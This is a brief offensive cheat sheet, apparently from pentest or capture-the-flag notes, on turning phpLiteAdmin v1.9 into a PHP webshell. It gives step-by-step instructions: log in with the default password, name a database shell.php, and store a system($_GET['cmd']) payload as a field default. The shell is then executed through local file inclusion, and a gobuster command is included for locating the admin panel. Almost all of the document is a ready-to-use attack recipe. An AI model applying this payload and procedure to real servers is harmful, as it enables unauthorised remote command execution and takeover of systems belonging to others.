# phpLiteAdmin SQLite Webshell

phpLiteAdmin (v1.9 and below) allows creating SQLite databases with PHP filenames and inserting PHP code as default values — triggering code execution via LFI.

## Steps
1. Login to phpLiteAdmin (default password: `admin`)
2. Create a new database named `shell.php` (or path with `.php` extension)
3. Create a table with a TEXT field
4. Set the field's default value to: `<?php system($_GET['cmd']); ?>`
5. Insert a row to trigger the default value write

## Result
The `.php` database file on disk contains the PHP webshell. Trigger via LFI:
```
http://<TARGET>/index.php?page=<path_to_shell.php>&cmd=whoami
```

## Find phpLiteAdmin
```bash
gobuster dir -u https://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
# Look for /db, /phpliteadmin, /admin/db
```

## Notes
- Version 1.9 is affected (EDB-24044)
- Combine with LFI to execute the created database file
- Default database storage path: same directory as phpLiteAdmin or configurable
- The DB file path must be accessible via LFI for execution
